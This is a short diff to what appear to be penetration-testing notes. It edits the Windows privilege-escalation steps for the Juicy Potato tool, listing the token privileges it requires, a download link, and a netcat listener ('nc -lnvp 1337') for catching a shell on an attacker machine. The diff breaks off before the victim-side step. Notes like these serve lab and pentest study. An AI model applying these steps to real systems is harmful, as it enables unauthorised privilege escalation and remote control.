@@ -205,7 +205,7 @@ Password Protected SSH Private Key:
 		
 	- Privelege escalation 
 		- Juicy Potato
-			- SeImpersonatePrivilege needs to be enabled: whoami /priv
+			- SeImpersonatePrivilege and seAssignPrimaryTokenPrivilege needs to be enabled: whoami /priv
 			- Download the exe: https://github.com/ohpe/juicy-potato/releases/tag/v0.1
 			- On the attacker machine listen on a port of you choosing: nc -lnvp 1337
 			- on the vicitm machine: 
